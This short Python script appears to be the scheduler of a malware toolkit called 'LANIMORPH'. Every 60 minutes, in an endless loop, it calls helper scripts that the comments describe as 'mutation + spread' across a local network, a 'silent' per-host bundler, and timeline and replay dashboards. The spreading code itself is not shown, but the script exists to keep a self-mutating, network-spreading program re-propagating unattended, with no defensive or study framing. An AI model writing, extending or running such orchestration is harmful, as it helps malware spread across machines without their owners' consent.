#!/usr/bin/env python3
import os, time, subprocess
from datetime import datetime

ROTATE_EVERY_MIN = 60  # Rotate every X minutes

def run_rotation():
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    print(f"[~] Auto-rotating at {timestamp}")

    # Step 1: Trigger mutation + spread
    os.system("python3 ~/lan_spread_auto.py")

    # Step 2: Silent bundle ZIP per-host
    os.system("python3 ~/LANIMORPH/chain/lan_silent_mutation_zipper.py")

    # Step 3: Update ASCII timeline
    os.system("python3 ~/LANIMORPH/chain/lan_silent_timeline_dash.py")

    # Step 4: (Optional) Generate replay dashboard
    os.system("python3 ~/LANIMORPH/chain/lan_chain_replay_dash.py")

while True:
    run_rotation()
    print("[✓] Waiting for next cycle...\n")
    time.sleep(ROTATE_EVERY_MIN * 60)
